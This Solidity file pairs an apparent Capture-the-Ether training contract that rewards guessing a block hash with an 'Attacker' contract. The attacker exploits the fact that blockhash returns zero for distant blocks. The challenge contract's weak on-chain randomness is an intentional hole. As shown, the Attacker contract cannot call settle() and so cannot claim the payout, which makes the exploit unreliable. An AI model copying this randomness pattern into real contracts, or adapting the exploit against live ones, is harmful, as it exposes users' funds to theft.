pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Attacker{
    uint256 settlementBlockNumber;

    PredictTheBlockHashChallenge instance;

    function Attacker(address _address) public{
        instance = PredictTheBlockHashChallenge(_address);
    }

    function createPrediction() external payable returns (uint256){
        settlementBlockNumber = block.number + 3;
        instance.lockInGuess.value(1 ether)(block.blockhash(settlementBlockNumber));
        return settlementBlockNumber;
    }

    function getCurrentBlock(uint256 _num) external view returns(bytes32){
        return block.blockhash(_num + block.number);
    }

    function() public payable{}
}